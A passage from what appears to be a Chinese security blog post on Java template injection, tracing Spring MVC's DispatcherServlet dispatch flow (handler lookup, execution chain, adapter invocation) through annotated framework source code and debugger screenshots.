class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 先检查是不是 Multipart 类型的，比如上传等；如果是 Multipart 类型的，则转换为 MultipartHttpServletRequest 类型</span><br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 执行链</span><br>            mappedHandler = getHandler(processedRequest);<br>            <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                noHandlerFound(processedRequest, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 适配器</span><br>            <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>            <span class="hljs-comment">// 对于 header 中 last-modified 的处理</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isGet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;GET&quot;</span>.equals(method);<br>            <span class="hljs-keyword">if</span> (isGet || <span class="hljs-string">&quot;HEAD&quot;</span>.equals(method)) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历所有定义的 interceptor，执行 preHandle 方法</span><br>            <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 实际调用 Handler 的地方</span><br>            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">// 处理成默认视图名，也就是添加前缀和后缀等</span><br>            applyDefaultViewName(processedRequest, mv);<br>            <span class="hljs-comment">// 拦截器postHandle方法进行处理</span><br>            mappedHandler.applyPostHandle(processedRequest, response, mv);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            dispatchException = ex;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>        &#125;<br>        <span class="hljs-comment">// 处理最后的结果，渲染之类的都在这里</span><br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="查找对应的-Handler-对象"><a href="#查找对应的-Handler-对象" class="headerlink" title="查找对应的 Handler 对象"></a>查找对应的 Handler 对象</h4><p><img src="/img/ssti(java)/ssti36.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到468行调用了getHandler方法，跟进一下</p>
<p>该方法主要是遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的，handlerMappings 包含 RequestMappingHandlerMapping、BeanNameUrlHandlerMapping、RouterFunctionMapping、SimpleUrlHandlerMapping 以及 WelcomePageHandlerMapping，在循环中会调用 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>来获取 Handler 执行链，若获取的 Handler 执行链不为 null，则返回当前请求的 Handler 执行链，DispatcherServlet 类的 getHandler 方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的</span><br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在循环中，根据 <code>mapping.getHandler(request);</code>，继续往下看 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 根据 request 获取 handler</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandlerInternal(request);<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果没有找到就使用默认的 handler</span><br>        handler = getDefaultHandler();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果 Handler 是 String，表明是一个 bean 名称，需要寻找对应 bean</span><br>    <span class="hljs-keyword">if</span> (handler <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br>        handler = obtainApplicationContext().getBean(handlerName);<br>    &#125;<br>    <span class="hljs-comment">// 封装 Handler 执行链</span><br>    <span class="hljs-keyword">return</span> getHandlerExecutionChain(handler, request);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>AbstractHandlerMapping 类中的 getHandler 方法中首先<strong>根据 request 获取 handler</strong>，看到调用了新的<strong>getHandlerInternal</strong> 方法</p>
<p><img src="/img/ssti(java)/ssti37.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进一下AbstractHandlerMethodMapping 类中的 <strong>getHandlerInternal</strong> 方法，看到该方法首先获取 request 中的 url，即 <code>/path</code>，用来匹配 handler 并封装成 HandlerMethod，然后根据 handlerMethod 中的 bean 来实例化 Handler 并返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">getHandlerInternal</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 获取 request 中的 url，用来匹配 handler</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);<br>    request.setAttribute(LOOKUP_PATH, lookupPath);<br>    <span class="hljs-built_in">this</span>.mappingRegistry.acquireReadLock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 根据路径寻找 Handler，并封装成 HandlerMethod</span><br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> lookupHandlerMethod(lookupPath, request);<br>        <span class="hljs-comment">// 根据 handlerMethod 中的 bean 来实例化 Handler，并添加进 HandlerMethod</span><br>        <span class="hljs-keyword">return</span> (handlerMethod != <span class="hljs-literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.mappingRegistry.releaseReadLock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到从request中获取了&#x2F;path</p>
<p><img src="/img/ssti(java)/ssti38.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来，我们看 <strong>lookupHandlerMethod</strong> 的逻辑，主要逻辑委托给了 <strong>mappingRegistry</strong> 这个成员变量来处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">lookupHandlerMethod</span><span class="hljs-params">(String lookupPath, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    List&lt;Match&gt; matches = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-comment">// 通过 lookupPath 属性中查找。如果找到了，就返回对应的RequestMappingInfo</span><br>    List&lt;T&gt; directPathMatches = <span class="hljs-built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);<br>    <span class="hljs-keyword">if</span> (directPathMatches != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果匹配到了，检查其他属性是否符合要求，如请求方法，参数，header 等</span><br>        addMatchingMappings(directPathMatches, matches, request);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 没有直接匹配到，则遍历所有的处理方法进行通配符匹配</span><br>        addMatchingMappings(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 如果方法有多个匹配，不同的通配符等，则排序选择出最合适的一个</span><br>        Comparator&lt;Match&gt; comparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatchComparator</span>(getMappingComparator(request));<br>        matches.sort(comparator);<br>        <span class="hljs-type">Match</span> <span class="hljs-variable">bestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 如果有多个匹配的，会找到第二个最合适的进行比较</span><br>        <span class="hljs-keyword">if</span> (matches.size() &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(matches.size() + <span class="hljs-string">&quot; matching mappings: &quot;</span> + matches);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;<br>                <span class="hljs-keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;<br>            &#125;<br>            <span class="hljs-type">Match</span> <span class="hljs-variable">secondBestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> bestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> secondBestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>                <span class="hljs-comment">// 不能有相同的最优 Match</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                        <span class="hljs-string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="hljs-string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="hljs-string">&quot;, &quot;</span> + m2 + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>            &#125;<br>        &#125;<br>        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);<br>        <span class="hljs-comment">// 设置 request 参数（RequestMappingHandlerMapping 对其进行了覆写）</span><br>        handleMatch(bestMatch.mapping, lookupPath, request);<br>        <span class="hljs-comment">// 返回匹配的 url 的处理的方法</span><br>        <span class="hljs-keyword">return</span> bestMatch.handlerMethod;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 调用 RequestMappingHandlerMapping 类的 handleNoMatch 方法再匹配一次</span><br>        <span class="hljs-keyword">return</span> handleNoMatch(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>之后通过createWithResolvedBean()方法，根据 handlerMethod 中的 bean 来实例化 Handler(找到对应控制器)</p>
<p>通过上面的过程，我们就获取到了 Handler。</p>
<p>看到动态调试时回到AbstractHandlerMapping 类中的 getHandler 方法继续执行，调用了getHandlerExecutionChain方法</p>
<p><img src="/img/ssti(java)/ssti39.png" srcset="/img/loading.gif" lazyload></p>
<p>该方法是用于<strong>封装执行链</strong>，将配置的拦截器加入到执行链中去，<strong>getHandlerExecutionChain</strong> 方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">// 如果当前 Handler 不是执行链类型，就使用一个新的执行链实例封装起来</span><br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ? (HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.urlPathHelper.getLookupPathForRequest(request, LOOKUP_PATH);<br>    <span class="hljs-comment">// 遍历拦截器，找到跟当前 url 对应的，添加进执行链中去</span><br>    <span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br>        <span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br>            <span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br>            <span class="hljs-keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="hljs-built_in">this</span>.pathMatcher)) &#123;<br>                chain.addInterceptor(mappedInterceptor.getInterceptor());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            chain.addInterceptor(interceptor);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>到此为止，我们就获取了当前请求的 Handler 执行链，接下来看下是如何获取请求的 <strong>Handler 适配器</strong>，主要依靠 <strong>DispatcherServlet 类的 getHandlerAdapter 方法</strong>，该方法就是遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回，在这里匹配到的为 RequestMappingHandlerAdapter。DispatcherServlet 类的 getHandlerAdapter 方法如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(Object handler)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerAdapters != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回</span><br>        <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>            <span class="hljs-keyword">if</span> (adapter.supports(handler)) &#123;<br>                <span class="hljs-keyword">return</span> adapter;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;No adapter for handler [&quot;</span> + handler +<br>            <span class="hljs-string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="HandlerAdapter-执行当前的-Handler"><a href="#HandlerAdapter-执行当前的-Handler" class="headerlink" title="HandlerAdapter 执行当前的 Handler"></a>HandlerAdapter 执行当前的 Handler</h4><p>再获取完当前请求的 Handler 适配器后，接着进行<strong>缓存处理</strong>，也就是对 last-modified 的处理，然后调用 applyPreHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，即遍历所有定义的 interceptor，执行 postHandle 方法，然后就到了实际执行 handle 的地方，doDispatch 方法中 handle 方法是执行当前 Handler，我们这里使用的是 RequestMappingHandlerAdapter，首先会进入 <strong>AbstractHandlerMethodAdapter 的 handle 方法</strong>：</p>
<p>实现执行 Controller 中 (Handler) 的方法,返回 ModelAndView 视图</p>
<p><img src="/img/ssti(java)/ssti40.png" srcset="/img/loading.gif" lazyload></p>
<p>在 AbstractHandlerMethodAdapter 的 handle 方法中又调用了 <strong>RequestMappingHandlerAdapter 类的 handleInternal 方法</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>    checkRequest(request);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.synchronizeOnSession) &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mutex</span> <span class="hljs-operator">=</span> WebUtils.getSessionMutex(session);<br>            <span class="hljs-keyword">synchronized</span> (mutex) &#123;<br>                mav = invokeHandlerMethod(request, response, handlerMethod);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            mav = invokeHandlerMethod(request, response, handlerMethod);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 执行方法，封装 ModelAndView</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!response.containsHeader(HEADER_CACHE_CONTROL)) &#123;<br>        <span class="hljs-keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;<br>            applyCacheSeconds(response, <span class="hljs-built_in">this</span>.cacheSecondsForSessionAttributeHandlers);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prepareResponse(response);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> mav;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在执行完 handle 方法后，然后调用 applyDefaultViewName 方法<strong>组装默认视图名称</strong>，将前缀和后缀名都加上，接着调用 applyPostHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，也就是遍历所有定义的 interceptor，执行 postHandle 方法</p>
<h4 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h4><p><code>invokeHandlerMethod()</code> 方法先执行目标的 <code>HandlerMethod</code>，并返回一个 <code>ModelAndView</code> 对象。比较重要的方法在第 512 行，此处的 handlerMethod 其实是 <code>com.abc.ssti.controller.ThymeleafController#path(String)</code>，这一个方法，通过 <code>this.createInvocableHandlerMethod()</code> 方法，将其封装成 <code>ServletInvocableHandlerMethod</code> 类，并让其具有 invoke 执行能力。</p>
<p><img src="/img/ssti(java)/ssti41.png" srcset="/img/loading.gif" lazyload></p>
<p>后续，给 <code>invocableMethod</code> 的各大属性赋值，在赋值完毕后 new 了一个 <code>ModelAndViewContainer</code> 对象，后续会将所有的值保存到这一个对象中。</p>
<p><img src="/img/ssti(java)/ssti42.png" srcset="/img/loading.gif" lazyload></p>
<p>往下走，先调用 <code>AsyncWebRequest</code> 进行异步请求的包装，后续针对是否是异步请求，做不同的处理。继续往下走，到 524行的地方是关键点，它调用了 <code>ServletInvocableHandlerMethod.invokeAndHandle()</code> 方法，调用这个方法的作用主要是获取到了 returnValueHandlers，跟进看一下。</p>
<p><img src="/img/ssti(java)/ssti43.png" srcset="/img/loading.gif" lazyload></p>
<p>在<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，做了如下操作：</p>
<ul>
<li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li>
<li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>0RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li>
<li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用Controller后获取返回值到returnValue中</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.invokeForRequest(webRequest, mavContainer, providedArgs);<br>        <span class="hljs-built_in">this</span>.setResponseStatus(webRequest);<br>        <span class="hljs-comment">//判断returnValue是否为空</span><br>        <span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//判断RequestHandled是否为True</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRequestNotModified(webRequest) || <span class="hljs-built_in">this</span>.getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>                <span class="hljs-built_in">this</span>.disableContentCachingIfNecessary(webRequest);<br>                <span class="hljs-comment">//设置RequestHandled属性</span><br>                mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(<span class="hljs-built_in">this</span>.getResponseStatusReason())) &#123;<br>            mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        mavContainer.setRequestHandled(<span 